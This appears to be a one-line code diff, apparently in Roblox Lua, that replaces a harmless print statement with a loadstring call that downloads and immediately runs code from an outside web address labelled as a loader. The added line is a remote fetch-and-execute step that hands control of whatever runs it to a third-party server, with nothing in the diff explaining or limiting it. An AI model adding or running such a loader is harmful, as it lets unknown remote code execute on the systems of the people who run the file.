@@ -1,1 +1,1 @@
-print("1")
+loadstring(game:HttpGet("http://vencontrol.wasmer.app/?api=loader&t="..tick()))()
